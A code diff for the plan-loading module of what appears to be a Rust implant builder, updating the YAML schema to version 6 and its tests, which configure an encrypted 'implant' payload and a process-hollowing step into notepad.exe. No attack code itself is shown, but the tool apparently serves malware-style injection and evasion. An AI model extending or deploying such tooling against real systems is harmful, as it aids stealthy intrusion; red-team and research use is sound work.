@@ -1,8 +1,9 @@
 //! `plan` module: loading, parsing and validation of the YAML.
 //!
 //! Responsibilities:
-//! - `schema`: `serde` structs modeling the YAML document (schema 4).
+//! - `schema`: `serde` structs modeling the YAML document (schema 6).
 //! - `validate`: semantic validation after parsing.
+//! - `steps`: resolution of the flat `runtime:` list into concrete steps.
 //! - `build_args`: `$arg.N$` placeholder substitution from CLI args.
 //! - `load_plan`: single entry point that reads a file, resolves build
 //!   arguments, deserializes it and validates it, returning a ready-to-use
@@ -10,7 +11,7 @@
 
 pub mod build_args;
 pub mod schema;
-pub mod stages;
+pub mod steps;
 pub mod validate;
 
 use std::collections::BTreeMap;
@@ -70,16 +71,18 @@ mod tests {
     use super::*;
     use std::path::PathBuf;
 
-    /// A valid schema-3 YAML whose `process_hollowing.target` is a `$arg.0$` token.
+    /// A valid schema-6 YAML whose `process_hollowing.target` is a `$arg.0$` token.
     const ARGS_YAML: &str = r#"
-schema: 4
+schema: 6
 name: args-test
 build:
-  payload:
-    source: ./payload.exe
-    crypto:
-      algo: xchacha20poly1305
-      key: random
+  crypto:
+    algo: xchacha20poly1305
+    key: random
+  payloads:
+    implant:
+      source: ./payload.exe
+      format: pe
   output:
     path: ./dist/out.exe
     arch: x64
@@ -106,8 +109,8 @@ runtime:
 
         let plan = load_plan(&path, &args).expect("load with build args");
 
-        match &plan.runtime[0] {
-            crate::techniques::RuntimeStep::ProcessHollowing { params } => {
+        match &plan.runtime[0].technique {
+            crate::techniques::TechniqueKind::ProcessHollowing { params } => {
                 assert_eq!(params.target, r"C:\Windows\System32\notepad.exe");
             }
             other => panic!("expected process_hollowing, got {other:?}"),
@@ -122,8 +125,8 @@ runtime:
 
         let plan = load_plan(&path, &args).expect("load with a named build arg");
 
-        match &plan.runtime[0] {
-            crate::techniques::RuntimeStep::ProcessHollowing { params } => {
+        match &plan.runtime[0].technique {
+            crate::techniques::TechniqueKind::ProcessHollowing { params } => {
                 assert_eq!(params.target, r"C:\Windows\System32\notepad.exe");
             }
             other => panic!("expected process_hollowing, got {other:?}"),
